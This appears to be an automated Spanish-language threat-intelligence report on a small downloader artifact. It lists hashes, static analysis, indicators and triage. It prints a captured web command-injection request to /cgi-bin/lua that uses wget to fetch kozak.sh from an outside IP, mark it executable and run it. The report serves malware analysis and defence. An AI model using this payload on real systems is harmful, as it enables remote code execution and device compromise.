# 🧬 Payload Analysis

`7f8e8ddd1997937aaf22289dbfabcbbcb46f751c29c902fc25bc6c63b9bea511`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 298 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `kozak.sh` en `hxxp://45.202.246.XXX/bins/kozak.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:45:19.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `7f8e8ddd1997937aaf22289dbfabcbbcb46f751c29c902fc25bc6c63b9bea511`
- **SHA1:** `3c124a51ddaac7a6b00faa584af15f04e0170363`
- **MD5:** `560997becaaab585c2e8efb3c4a0bb94`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 298 B |
| Entropía | 5.29 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/lua?cmd=os.execute("wget%20-O%20/tmp/kozak.sh%20http://45.202.246.XXX/bins/kozak.sh;%20chmod%20+x%20/tmp/ko
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://45.202.246.XXX/bins/kozak.sh;%20chmod%20+x%20/tmp/kozak.sh;%20/tmp/kozak.sh%20 | strings |
| ip | 45.202.246.XXX | static_analysis |
| ip | 190.179.166.XXX | static_analysis |
| command | GET /cgi-bin/lua?cmd=os.execute("wget%20-O%20/tmp/kozak.sh%20http://45.202.246.XXX/bins/kozak.sh;%20chmod%20+x%20/tmp/ko | strings |
| hash | 7f8e8ddd1997937aaf22289dbfabcbbcb46f751c29c902fc25bc6c63b9bea511 | static_analysis |
| ip | 64.89.162.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
